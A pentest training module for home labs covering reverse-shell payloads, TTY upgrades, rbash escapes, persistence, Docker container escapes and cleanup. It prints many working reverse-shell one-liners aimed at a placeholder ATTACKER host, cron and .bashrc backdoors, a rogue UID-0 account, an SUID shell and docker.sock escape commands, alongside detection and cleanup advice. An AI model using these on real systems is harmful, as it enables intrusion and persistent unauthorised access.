# 06 — Shells, Persistence and Escapes

Getting a shell is the halfway point, not the finish line. This module covers what
to do the moment a payload fires: stabilising the terminal, escaping a restricted
shell, holding access, getting out of a container, and — importantly — undoing all
of it.

Full treatment: [`docs/CONCEPTS.md` §12](../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)
and [§16](../docs/CONCEPTS.md#16-post-exploitation-and-lateral-movement).

---

## 1. Reverse vs bind

| | **Reverse shell** | **Bind shell** |
| --- | --- | --- |
| Who connects | **target → you** | **you → target** |
| Firewall | Usually passes (outbound is often unrestricted) | Usually blocked (inbound to an odd port is denied) |
| Your IP must be | Routable from the target | Irrelevant |
| Default choice | ✅ **Yes** | Only when the target cannot reach you |

```bash
# ATTACKER: listen first
nc -lvnp 4444
# TARGET payload
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

`nc -lvnp 4444` — `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p 4444`
port. **Start the listener before you trigger the payload.** Forgetting this is the
most common self-inflicted failure in the entire path.

> **Ports below 1024 need root.** `nc -lvnp 80` fails unless you use `sudo`. Use
> 4444, 4445, 9001 or similar; if you must use a low port, `sudo nc -lvnp 443`.

### Payloads that work when `bash` does not

Not every environment has bash, `nc`, or a shell at all. Know several:

```bash
# bash's /dev/tcp — needs no nc
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# netcat variants
nc -e /bin/bash ATTACKER 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER 4444 > /tmp/f

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# perl, php, ruby, socat
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane   # fully interactive
```

**`socat` is worth the extra setup** because it gives you a *proper* PTY in one
step, with job control:

```bash
# ATTACKER
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Machine 4's `less`/`vi` escalation and Machine 9's `lxd` escape both benefit from a
stabilised shell before you attempt the next step.

---

## 2. Upgrading to a full TTY

A raw `nc` shell has no TTY. Symptoms: `sudo` refuses to prompt, `Ctrl+C` kills
your listener instead of the remote command, arrow keys print `^[[A`, `vi` is
unusable, and tab completion does nothing.

**Quick upgrade:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
script -q /dev/null -c /bin/bash
```

**Full upgrade — the two-step, worth memorising:**

```bash
# STEP 1 (on the target)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# STEP 2: press  Ctrl+Z          -> back at your OWN shell
# STEP 3 (on your attack box)
stty raw -echo; fg
# STEP 4 (back on the target)
reset
stty rows 40 cols 160            # match your terminal: stty size
```

> ### 📖 Concept — Why `Ctrl+Z` behaves strangely, and why `stty raw -echo` fixes it
> Your local terminal driver is interpreting keystrokes *before* they reach `nc`: it
> turns `Ctrl+C` into SIGINT for the local process and handles backspace and line
> editing itself. That is why `Ctrl+C` kills your listener and why arrow keys arrive
> as escape sequences.
>
> `stty raw -echo` tells your local terminal to **stop interpreting anything** and
> pass raw bytes through, with local echo disabled — so the *remote* shell, which now
> has a real PTY, does the interpretation instead. `raw` alone would leave your
> keystrokes echoed twice.
>
> **The cost:** `raw` disables `Ctrl+C` and `Ctrl+Z` on your local side, so you can
> no longer interrupt the session locally. To get out, type `exit`, or kill the
> listener from a second terminal. **If your terminal looks broken afterwards, type
> `reset` blind and press Enter** — it works even with echo off.

> **Match the window size.** If `vi` or `top` renders garbage, run `stty size`
> locally and `stty rows R cols C` on the target. This is cosmetic but it wastes
> twenty minutes if you do not know the cause.

---

## 3. Escaping a restricted shell (`rbash`)

A restricted shell limits what you may do — typically no `cd`, no setting `PATH`, no
redirecting output, and no commands containing `/`.

```bash
$ cd /tmp
rbash: cd: restricted
$ /bin/ls
rbash: /bin/ls: restricted
```

First confirm what you are in: `echo $0`, `echo $SHELL`, `set -o | grep restricted`,
`ls -l /bin/sh`.

**The escapes, most reliable first:**

| # | Technique | Command |
| --- | --- | --- |
| 1 | A program that spawns a shell | `find . -exec /bin/sh \; -quit` |
| 2 | An interpreter | `python3 -c 'import os; os.system("/bin/bash")'` · `perl -e 'exec "/bin/sh"'` · `awk 'BEGIN{system("/bin/sh")}'` |
| 3 | A pager's shell command | `less /etc/profile` then `!/bin/sh` · `more` likewise |
| 4 | An editor | `vi -c ':!/bin/sh'` · `vi` then `:set shell=/bin/sh` `:shell` |
| 5 | `ssh` with a command | `ssh user@target -t "/bin/bash --noprofile"` |
| 6 | `env` / `ftp` / `gdb` | `env /bin/sh` · `ftp -e 'shell'` · `gdb -q -ex 'shell /bin/sh'` |
| 7 | Coping with the redirect ban | `tar cf /dev/null /etc` `--checkpoint=1 --checkpoint-action=exec=/bin/sh` |

**Machine 4 (DC: 2) is the canonical rbash box.** Its SSH user lands in a
restricted shell, and the intended solution is to escape through a program that is
permitted — then `sudo less` or `sudo vi` gives you root (see
[module 05 §1](05-Linux-Privilege-Escalation.md)).

**Machine 6 (bossplayersCTF)** and **Machine 10 (PwnLab: init)** both have shell
escapes too, via different doors.

> **`--noprofile` and `--norc` matter.** A restricted shell is often imposed by
> `~/.bashrc` or `~/.profile` rather than by the binary itself. Spawning bash with
> those files skipped gives you an unrestricted shell with no escape technique at all.
> `ssh user@target -t 'bash --noprofile'` is worth trying before anything clever.

---

## 4. Persistence

Once you are in, access is fragile: the machine may be rebooted, the web shell
deleted, or your listener dropped. Persistence means surviving that.

```bash
# 1. SSH key — the cleanest and most common
echo 'ssh-rsa AAAA... attacker@kali' >> /home/user/.ssh/authorized_keys
chmod 700 /home/user/.ssh; chmod 600 /home/user/.ssh/authorized_keys   # sshd IGNORES loose perms
ssh -i id_rsa user@target

# 2. A web shell that survives (Machine 13's upload, Machine 3's theme editor)
#    /var/www/html/wp-content/uploads/2019/04/x.php

# 3. A cron entry running as your user
echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' | crontab -

# 4. A startup file
echo '...' >> ~/.bashrc      # fires on interactive login
echo '...' >> /etc/rc.local  # fires at boot, if root

# 5. A new account (Machine 1's /etc/passwd trick IS persistence)
echo 'ignite:HASH:0:0::/root:/bin/bash' >> /etc/passwd

# 6. SUID backdoor (leaves a very loud forensic trace)
cp /bin/bash /tmp/.x && chown root /tmp/.x && chmod u+s /tmp/.x
/tmp/.x -p
```

> ### 📖 Concept — Persistence and the blue team
> Every technique above leaves an artefact: a key in `authorized_keys`, a line in a
> crontab, a file with an SUID bit, a web shell in an uploads directory, a UID-0
> account that should not exist. Defenders detect on exactly these — file integrity
> monitoring (AIDE, Tripwire), cron auditing, `authorized_keys` review, and web-root
> diffing. When you write up a machine, **list what you left behind**: it turns your
> notes into a detection-rule specification, which is half the value of the exercise.

**Also: keep your notes.** Every credential, every uploaded file path, every
modified config. See the note-taking template in
[module 00 §6](00-Before-You-Start.md).

---

## 5. Escaping a container (Machine 13)

**Machine 13 (HackInOS: 1)** ends inside a Docker container with `root`. `id` says
`uid=0`, and yet the flag is not reachable — because container root is **not** host
root.

> ### 📖 Concept — Why container root is not real root
> A container is a set of namespaces (isolated view of processes, network, mounts,
> users) plus cgroups (resource limits) plus a filtered capability set and seccomp
> profile. Your `uid=0` is root *inside the user namespace the container defines*.
> The dangerous files — the host's `/etc/shadow`, the host's Docker socket — are not
> mounted in. Escaping means finding a bridge back to a host-privileged context.

**First, confirm where you are:**

```bash
cat /proc/1/cgroup | grep -q docker && echo "IN A CONTAINER"
ls -la /.dockerenv                      # present in most Docker containers
cat /proc/self/mountinfo | grep overlay # overlayfs = container filesystem
hostname; ip a; ps aux | head -20       # tiny PID list, odd IP
```

**Then look for a bridge:**

| Finding | Escape |
| --- | --- |
| `/var/run/docker.sock` mounted | `curl --unix-socket /var/run/docker.sock http://localhost/containers/json` → create a privileged container mounting host `/` |
| A **privileged** container (`CapEff: 0000003fffffffff`) | `mount /dev/sda1 /mnt` → write to host root |
| `cap_sys_admin` | mount cgroups / `release_agent` trick |
| A **mounted host directory** | Write a cron job or an `authorized_keys` into it |
| `--pid=host` | `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash` |
| A vulnerable kernel + `--privileged` | any local-root exploit reaches the host |

Machine 13's route is the **mounted host volume**: the container's filesystem is
shared with the host in one specific directory, and writing there lands you on the
host. Check `/proc/mounts` for anything bind-mounted from outside:

```bash
cat /proc/mounts | grep -v 'overlay\|proc\|sysfs\|cgroup\|tmpfs\|devpts\|mqueue'
ls -la /            # look for an unusual directory
```

> **Also worth knowing:** the *other* container escape in this path is the `lxd` one
> on Machine 9, which is not really an escape at all — it is using a legitimately
> granted group membership to create a **privileged** container with the host root
> mounted. See [module 05 §8](05-Linux-Privilege-Escalation.md).

---

## 6. Cleaning up — non-negotiable

You are working on a machine you own, on a network you own. That does not license
leaving it in a worse state, and the discipline transfers directly to paid
engagements.

```bash
# remove your web shell
rm -f /var/www/html/wp-content/uploads/2019/04/x.php

# remove your cron entries
crontab -l | grep -v 'ATTACKER' | crontab -
rm -f /etc/cron.d/mine

# remove your SSH key
#   edit /home/user/.ssh/authorized_keys and delete YOUR line only

# remove the account you created
#   delete the line from /etc/passwd (and /etc/shadow if you touched it)

# remove any uploaded binary or script
rm -f /tmp/x /tmp/f /tmp/.x

# restore files you edited
```

**Then verify:** re-run `ls -la` on every path you touched, and `crontab -l`, and
`cat /etc/passwd | tail`.

> **The better answer on a lab is the snapshot.** If you snapshotted the VM before
> you started ([module 00 §4](00-Before-You-Start.md)), revert to it. That is
> guaranteed-complete cleanup. The reason to still practise manual cleanup is that on
> a real engagement you often cannot revert — and because writing down exactly what
> you changed is a deliverable your client is entitled to.

---

## 7. Reporting

Every machine in this path should end with a short write-up. Structure it the way
[`labs/3-059-raven-1/README.md`](../labs/3-059-raven-1/README.md) is structured —
that file is the house reference implementation and is worth reading once in full
before you write your own.

The minimum per finding:

| Field | Example |
| --- | --- |
| **What** | Anonymous FTP exposes `backup.zip` containing `wp-config.php` |
| **Where** | `ftp://192.168.56.101/pub/backup.zip` |
| **How you found it** | `nmap -sC -p21` reported `ftp-anon: Anonymous FTP login allowed` |
| **Impact** | Full database credentials → admin access → RCE |
| **Evidence** | Screenshot / exact command output |
| **Fix** | Disable anonymous FTP; move backups outside the served tree; rotate credentials |

**Severity is about impact and reachability, not cleverness.** A world-writable
`/etc/passwd` found in ten seconds is *critical*; an obscure XSS nobody can reach
is *low*. Rate what the client loses.

---

## 8. Exercises

1. **Catch a reverse shell against yourself.** Run `python3 -m http.server` on a
   directory containing a `shell.php` that calls back to `nc -lvnp 4444` on your
   attack box, load it in a browser, and describe exactly what appeared.
2. **Upgrade a raw shell** using both the quick method and the full two-step. Note
   what `sudo`, `vi` and `Ctrl+C` do before and after.
3. **Break and repair your terminal.** Run `stty raw -echo` locally, observe that
   typing appears to do nothing, then recover with a blind `reset`. Do this
   deliberately once so it never surprises you mid-lab.
4. **Build your own rbash.** `cp /bin/bash ~/rbash`, add `rbash` to `/etc/shells`,
   create a user whose shell is `~/rbash`, and set `PATH` to a directory with only
   `ls` and `cat`. Try the seven escapes above. Which worked?
5. **Inspect a container from inside.** `docker run -it --rm alpine sh`, then run
   every detection command in §5. Now run `docker run -it --rm -v
   /var/run/docker.sock:/var/run/docker.sock alpine sh` and confirm you can list the
   host's containers.
6. **Write a full clean-up list** for one machine you have already completed in this
   path, naming every artefact you created and the command that removes it.

---

## 9. Check yourself

1. Why is a reverse shell the default choice over a bind shell?
2. Name three payloads that work when `bash` and `nc` are both absent.
3. Your shell will not let `sudo` prompt for a password. What is wrong, and what are
   the two commands that fix it?
4. What does `stty raw -echo` do to your local terminal, and what is the cost?
5. Your terminal is unusable after a session. What do you type, and why does it work
   even though you cannot see it?
6. How do you confirm you are inside a Docker container?
7. Why is `uid=0` inside a container usually not host root?
8. Name three bridges out of a container.
9. Why does `bash --noprofile` sometimes defeat a restricted shell with no exploit
   at all?
10. List four artefacts you must remove before handing a machine back.

---

## 10. Annotated command reference — every input, every output

`ATTACKER` = your Kali on the lab interface, `TARGET` = the victim VM.

---

### 10.1 `nc -lvnp` — the listener

```bash
nc -lvnp 4444
```

```text
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.104.
Ncat: Connection from 192.168.56.104:52114.
ls -la
total 28
drwxr-xr-x 2 root root 4096 May 11 14:41 .
```

| Token | Meaning |
| --- | --- |
| `-l` | **l**isten — nc becomes a server instead of a client. Without it, nc tries to *connect* and fails |
| `-v` | verbose: report connections and errors. Without `-v` you get a silent black screen and cannot tell listening from broken |
| `-n` | no DNS resolution. Faster, and avoids leaking your queries |
| `-p 4444` | the local port to bind. **Ports below 1024 need root** — `nc -lvnp 80` fails with `Permission denied` unless you `sudo` |
| `-k` | keep listening after a client disconnects, accepting more. **Do not use this for a reverse shell** — the shell you want is the *first* connection, and `-k` can leave you attached to the wrong session |
| `-e /bin/bash` | execute a program with its stdio attached to the socket. Modern ncat often ships **without** `-e` support (`NCAT_ENABLE_EXEC` off) — which is why the `mkfifo` and `/dev/tcp` variants exist |
| `--ssl` | wrap the connection in TLS, so your shell traffic is not plaintext on the wire |

**Reading it.** `Listening on 0.0.0.0:4444` — bound to **all** interfaces, so the target
VM can reach you. If it said `127.0.0.1:4444` the target could never connect. `:::4444`
is the IPv6 equivalent, also all-interfaces. `Connection from 192.168.56.104:52114`
confirms the target reached you, from its **ephemeral** source port `52114`. Everything
after that is your shell.

**Start the listener *before* you trigger the payload.** Forgetting this is the most
common self-inflicted failure in the whole path: the target connects, finds nothing
listening, gets a connection refusal, and the one-shot payload is consumed. You then
trigger it again and wonder why nothing happens. If you must re-trigger, restart nc first.

---

### 10.2 The payloads, and what each part does

```bash
# bash's own TCP support — needs no nc on the target
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# netcat with -e, when the build supports it
nc -e /bin/bash ATTACKER 4444

# the mkfifo variant — works with ANY POSIX shell and a plain nc
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER 4444 > /tmp/f

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# socat — a proper PTY in one step
socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# perl, php, ruby
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e 'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**The bash one, token by token — this is the payload to understand deeply.**

| Token | Meaning |
| --- | --- |
| `bash` | invoke bash specifically. `/bin/sh` on Debian is `dash`, which has **no** `/dev/tcp` support, so `sh -i >& /dev/tcp/…` silently does nothing |
| `-i` | **interactive**: enables job control and, crucially, prints a prompt |
| `>& /dev/tcp/ATTACKER/4444` | redirect **stdout** (`1`) to a TCP connection. `/dev/tcp/host/port` is a bash-internal pseudo-device: bash opens the socket itself, no external program needed |
| `0>&1` | redirect **stdin** (`0`) to wherever stdout now points — the socket. So your keystrokes travel to the target and its output travels back |

Together: stdout → socket, stdin → socket. **stderr (`2`) is left pointing at the
target's own terminal**, which is why you sometimes see a shell that responds but prints
errors nowhere you can read them. Add `2>&1` to capture it.

**The `mkfifo` variant, decoded.** `mkfifo /tmp/f` creates a **named pipe** — a file that
acts as a queue. `cat /tmp/f` reads from it into bash's stdin; bash's output goes into
`nc`; `nc`'s output is written back into `/tmp/f`. The pipe closes the loop that plain
`nc | bash` cannot, because a shell pipeline is one-directional and you need a **cycle**:
your keystrokes → shell → output → your screen. `rm -f /tmp/f` first so a stale pipe does
not break it. This variant works on systems where `bash` lacks `/dev/tcp` and `nc` lacks
`-e`, which is most of them.

**socat, decoded:**

```bash
# ATTACKER
socat file:`tty`,raw,echo=0 tcp-listen:4444
# TARGET
socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

| Token | Meaning |
| --- | --- |
| `file:`tty`` | attach to **your own terminal device**, resolved by the shell |
| `raw,echo=0` | put it in raw mode with local echo off — the same two settings you would otherwise apply by hand with `stty` |
| `tcp-listen:4444` | listen for the connection |
| `EXEC:/bin/bash` | run bash with its stdio attached to the connection |
| **`pty`** | allocate a **pseudo-terminal** for it. This is the whole point: the target-side bash believes it has a real terminal, so `sudo`, `su`, `vi`, `top` and job control all behave normally |
| `stderr` | merge stderr into the same stream |
| `setsid` | give it a new session, so it survives the parent process dying |
| `sigint` | forward Ctrl+C properly |
| `sane` | apply standard terminal settings |

socat costs you a download on the target and is worth it: you get a fully interactive
shell in one step, with no manual `stty` dance.

---

### 10.3 The TTY upgrade — both steps, and why

```bash
# STEP 1 — on the target, inside the raw shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
export SHELL=bash

# STEP 2 — press Ctrl+Z.  You are now at your OWN Kali prompt:
# [1]+  Stopped                 nc -lvnp 4444

# STEP 3 — on your attack box
stty size                       # read your terminal's rows/cols first, e.g. "40 160"
stty raw -echo; fg

# STEP 4 — back on the target
reset
stty rows 40 cols 160
```

**Step 1, decoded.** `python3 -c 'import pty; pty.spawn("/bin/bash")'` — the `pty` module
allocates a **pseudo-terminal pair**: a master and a slave. `pty.spawn` runs bash attached
to the slave while relaying between the master and your socket. From bash's point of view
it now has a real terminal, so it enables line editing, job control, and interactive
programs. `script -q /dev/null -c /bin/bash` achieves the same thing via `util-linux`;
`/usr/bin/script` exists on more minimal systems than Python does, so know both.

**Why `Ctrl+Z` is in the middle.** `stty` configures *your local terminal*, and you cannot
run it while your terminal is glued to the remote shell. `Ctrl+Z` sends SIGTSTP and
**suspends nc locally**, dropping you back to your own Kali prompt with the shell still
alive in the background. `[1]+ Stopped  nc -lvnp 4444` is bash's job table confirming
this. `fg` then brings job 1 back to the foreground.

**Step 3, decoded.** `stty raw -echo`:
- **`raw`** — disable *all* local input processing: no line buffering, no interpretation
  of `Ctrl+C`, `Ctrl+Z`, `Ctrl+S`, no newline translation. Bytes pass through untouched.
- **`-echo`** — disable local echo. Without this, every keystroke appears twice: once from
  your terminal and once echoed back by the remote shell.
- `;` — a command separator, so `fg` runs *after* `stty` in the same line. **If you press
  Enter between them, the shell may interpret your Enter as an interrupt.** Type the whole
  line and press Enter once.

`stty size` prints `rows cols` (e.g. `40 160`). Capture it *before* going raw, because
afterwards you cannot read the screen reliably.

**Step 4, decoded.** `reset` reinitialises the terminal: it clears the screen, restores
sane modes, and re-reads the terminal capabilities from `TERM`. You need it because the
target's shell inherited a `TERM` of `dumb` or nothing, so `vi` and `top` render garbage.
`stty rows 40 cols 160` on the *target* tells the remote terminal the real window size —
without it, editors wrap at 80 columns inside a 160-column window and full-screen tools
smear.

> ### 📖 Why Ctrl+C misbehaves, precisely
>
> Before the upgrade, your **local** terminal driver interprets keystrokes before they
> reach `nc`: it turns `Ctrl+C` into SIGINT *for the local process* — which is `nc` — so
> your listener dies and the shell with it. Arrow keys arrive as literal `^[[A` escape
> sequences because nothing is translating them. `sudo` refuses to prompt because there is
> no TTY to read a password from (`sudo: no tty present and no askpass program
> specified`).
>
> After `stty raw -echo`, the local driver passes bytes through untouched and the
> **remote** shell — which now owns a real PTY — does the interpreting. `Ctrl+C` kills the
> remote command, not your listener. `vi` works. Tab completion works.
>
> **The cost:** `raw` disables local `Ctrl+C` and `Ctrl+Z`, so you can no longer break out
> locally. Exit with `exit`, or kill the listener from a second terminal. And if your
> terminal looks completely broken afterwards — no echo, no newline handling, garbage on
> screen — **type `reset` blind and press Enter.** It works even though you cannot see it,
> because the bytes still reach the shell.

---

### 10.4 Escaping `rbash`

```bash
echo $0; echo $SHELL
set -o | grep restricted
echo $PATH
ls -l /bin/sh
```

```text
-rbash
/bin/rbash
restricted        on
/usr/local/bin:/usr/bin:/bin:/usr/games:/usr/local/rbash
lrwxrwxrwx 1 root root 4 Mar  9  2019 /bin/sh -> bash
```

**Confirm what you are in before trying to escape.** `$0` is the name the shell was
invoked as; `$SHELL` is your login shell from `/etc/passwd`; `set -o` lists shell options
and `restricted on` is definitive. `echo $PATH` shows whether `PATH` is pinned to a
curated directory — and if that directory contains a symlink to a real shell, you are done
already.

```bash
# 1. A program that spawns a shell
find . -exec /bin/sh \; -quit
# 2. Interpreters
python3 -c 'import os; os.system("/bin/bash")'
perl -e 'exec "/bin/sh"'
awk 'BEGIN {system("/bin/sh")}'
# 3. Pagers
less /etc/profile        # then type  !/bin/sh
more /etc/profile        # same
# 4. Editors
vi -c ':!/bin/sh' /dev/null
vi                       # then  :set shell=/bin/bash  :shell
nano                     # then  Ctrl-R Ctrl-X  /bin/sh
# 5. Skip the startup files entirely
bash --noprofile --norc
ssh user@TARGET -t "/bin/bash --noprofile"
# 6. Others
env /bin/sh
ftp -e 'shell'
gdb -q -ex 'shell /bin/sh'
tar cf /dev/null /etc --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**What `rbash` actually blocks:** `cd` (changing directory), setting or unsetting `SHELL`,
`PATH`, `ENV` and `BASH_ENV`, any command containing a **`/`** (so `/bin/ls` is refused),
redirecting output with `>`, `>>`, `>|`, `<>`, and `exec`-ing over the shell.

```text
$ cd /tmp
rbash: cd: restricted
$ /bin/ls
rbash: /bin/ls: restricted
$ ls > out.txt
rbash: out.txt: cannot redirect output
```

**The conceptual weakness.** `rbash` restricts **one process**. Anything that process can
*spawn* is unrestricted — and every escape above is just a way of spawning. That is why
`rbash` is a convenience feature and not a security boundary, and why Machine 4's author
used it: to teach you the difference.

**`--noprofile --norc` deserves emphasis.** A restricted shell is frequently imposed by
`~/.bashrc` or `~/.profile` (which set `PATH` and start bash with `--restricted`) rather
than by the binary. Spawning a bash that skips both files is then an unrestricted shell
with no technique at all. `ssh user@TARGET -t '/bin/bash --noprofile'` should be your
*first* attempt, before anything clever. The `-t` forces a TTY allocation, which you need
for an interactive shell over SSH.

**After escaping, fix your environment:**

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
```

Otherwise you have a real bash with a crippled `PATH`, and `ls`, `id` and `sudo` all
report `command not found` — which looks exactly like a failed escape.

---

### 10.5 Persistence — what each artefact looks like

```bash
# SSH key
mkdir -p /home/user/.ssh && chmod 700 /home/user/.ssh
echo 'ssh-ed25519 AAAAC3Nz… attacker@kali' >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
ssh -i id_ed25519 user@TARGET

# User cron
echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' | crontab -
crontab -l

# Startup file
echo 'nohup /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1" >/dev/null 2>&1 &' >> ~/.bashrc

# New root account
echo 'ignite:$1$ignite$XpO6y1nK1vB0yG0yQ3m0o0:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd

# SUID backdoor (very loud forensically)
sudo cp /bin/bash /tmp/.x && sudo chown root /tmp/.x && sudo chmod u+s /tmp/.x
/tmp/.x -p
```

| Token | Meaning |
| --- | --- |
| `chmod 700 /home/user/.ssh` | owner-only directory. **`sshd` refuses an `authorized_keys` in a group- or world-writable directory** |
| `chmod 600 …/authorized_keys` | owner-only file, for the same reason |
| `\| crontab -` | install this user's crontab **from stdin**, replacing whatever was there |
| `crontab -l` | list it — always verify, and always note what you replaced so you can restore it |
| `>> ~/.bashrc` | append; fires on every interactive login. `~/.profile` fires on login shells; `/etc/profile` fires for everyone |
| `nohup … &` | detach from the terminal and background it, so logging out does not kill it |
| `>/dev/null 2>&1` | discard both streams, so nothing appears in the user's session |
| `chmod u+s` | set the SUID bit → `-rwsr-xr-x`, root-owned, so `/tmp/.x -p` is root |

**Every one of these leaves a detectable artefact**, and naming them is half the value of
the exercise: a new line in `authorized_keys`, an unexpected crontab entry, a file with an
SUID bit in `/tmp`, a UID-0 account nobody created, an appended line in `.bashrc`.
Defenders detect on exactly these, with file-integrity monitoring (AIDE, Tripwire), cron
auditing, `authorized_keys` review, and web-root diffing. **Write them into your notes as
you create them** and your cleanup list writes itself.

---

### 10.6 Container detection and escape

```bash
# Am I in a container?
ls -la /.dockerenv
cat /proc/1/cgroup
cat /proc/self/mountinfo | grep overlay
hostname
cat /proc/mounts | grep -vE 'overlay|proc|sysfs|cgroup|tmpfs|devpts|mqueue'
capsh --print
```

```text
-rw-r--r-- 1 root root 0 Mar  9  2019 /.dockerenv
12:memory:/docker/1afdd1f6b82c9d4e…
1:/name=systemd:/docker/1afdd1f6b82c9d4e…
1afdd1f6b82c
/ / overlay rw,relatime,lowerdir=…,upperdir=/var/lib/docker/overlay2/…/diff,workdir=…
```

| Check | What it proves |
| --- | --- |
| `/.dockerenv` | an empty marker file Docker creates. Present in most containers, absent in some runtimes |
| `/proc/1/cgroup` containing `/docker/…` | PID 1 belongs to a Docker cgroup. The hex string is the **container ID** |
| `hostname` being a 12-char hex string | the container ID is used as the hostname by default |
| `mountinfo` showing `overlay` with `upperdir=/var/lib/docker/overlay2/…` | an **OverlayFS** root — the classic Docker storage driver |
| `ps aux` showing very few processes | a container runs one service tree, not a full init |
| `ip a` showing `eth0` at `172.17.0.x` | Docker's default bridge network |

**Then look for a bridge out:**

```bash
ls -l /var/run/docker.sock
grep Cap /proc/self/status
cat /proc/mounts | grep -E '/host|/mnt|/media'
```

```text
srw-rw---- 1 root docker 0 May 11 15:02 /var/run/docker.sock
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
```

**`CapEff: 0000003fffffffff` means you are in a `--privileged` container** — every
capability is enabled, which is effectively root on the host. A normal unprivileged
container shows something like `00000000a80425fb` (a small subset). `grep Cap
/proc/self/status` is therefore a two-second test for "am I privileged?", and it is the
first thing to check.

| Finding | Escape |
| --- | --- |
| `/var/run/docker.sock` mounted | Talk to the host's Docker daemon as root: `curl --unix-socket /var/run/docker.sock http://localhost/containers/json`, then create a container mounting host `/` |
| **Privileged** container | `mount /dev/sda1 /mnt` → the host's real filesystem |
| `cap_sys_admin` | mount cgroups and use the `release_agent` trick |
| A bind-mounted host directory | Write a cron job or an `authorized_keys` into it — the file lands on the host |
| `--pid=host` | `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash` |

```bash
# The docker.sock escape, spelled out
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/host"],"Privileged":true}'
```

`--unix-socket` tells curl to speak HTTP over that **socket file** instead of TCP — which
is exactly why mounting it into a container is fatal: the Docker API has no authentication
of its own beyond socket permissions, and the socket is owned by `root:docker`.

And on the **host**, the group-membership escape (Machine 13):

```bash
id                                       # groups=…,999(docker)
docker run -v /:/host --rm -it alpine chroot /host
cat /host/root/flag
```

`-v /:/host` bind-mounts the host's entire root into the container; `chroot /host` then
makes it the process's filesystem root, so `/bin/sh` inside it is the host's root shell.
No CVE, no exploit — only a group membership that is root-equivalent by design.

---

### 10.7 Cleanup — the commands, and how to verify them

```bash
rm -f /var/www/html/wp-content/uploads/2019/04/x.php     # web shell
crontab -l | grep -v 'ATTACKER' | crontab -              # your cron entries only
rm -f /etc/cron.d/mine
sed -i '/attacker@kali/d' /home/user/.ssh/authorized_keys # YOUR key line only
sed -i '/^ignite:/d' /etc/passwd                          # the account you added
rm -f /tmp/x /tmp/f /tmp/.x /tmp/leak.tar /tmp/linpeas.sh
```

```bash
# Verify — this is the part people skip
ls -la /var/www/html/wp-content/uploads/2019/04/
crontab -l; ls -la /etc/cron.d/
grep -c . /home/user/.ssh/authorized_keys
tail -3 /etc/passwd
find / -perm -4000 -newer /etc/hostname -type f 2>/dev/null
```

Each verification answers one question: is the web shell gone, are there cron entries you
did not write, does `authorized_keys` still contain only its original lines, is `/etc/passwd`
back to its original length, and is there any SUID file created after you arrived. **`-newer
/etc/hostname`** is a neat trick: it selects files modified more recently than a file you
know you did not touch, which surfaces everything you created without needing to remember
each path.

**Then the better answer:** revert the snapshot. If you snapshotted before you started,
that is guaranteed-complete cleanup. Practise the manual route anyway, because on a real
engagement you often cannot revert — and because writing down exactly what you changed is a
deliverable your client is entitled to.

---

_Back to [Learning Path 1](README.md) · previous: [05 — Linux Privilege Escalation](05-Linux-Privilege-Escalation.md) · next: the [machine lesson cards](Machines/01-basic-pentesting-1.md)._
